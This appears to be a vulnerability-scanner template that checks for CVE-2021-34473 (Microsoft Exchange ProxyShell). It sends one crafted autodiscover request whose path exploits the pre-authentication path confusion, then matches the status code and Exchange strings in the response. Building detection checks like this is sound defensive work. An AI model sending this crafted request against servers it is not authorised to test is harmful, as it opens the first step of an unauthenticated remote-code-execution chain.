id: CVE-2021-34473
name: "Microsoft Exchange ProxyShell"
severity: critical
description: "Microsoft Exchange Server contains a pre-auth path confusion vulnerability allowing unauthenticated remote code execution."
reference: CWE-918
requests:
  - method: GET
    path: "/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com"
    matchers:
      - type: status
        status: [200, 302]
      - type: body
        words:
          - "Microsoft"
          - "Exchange"
    condition: and
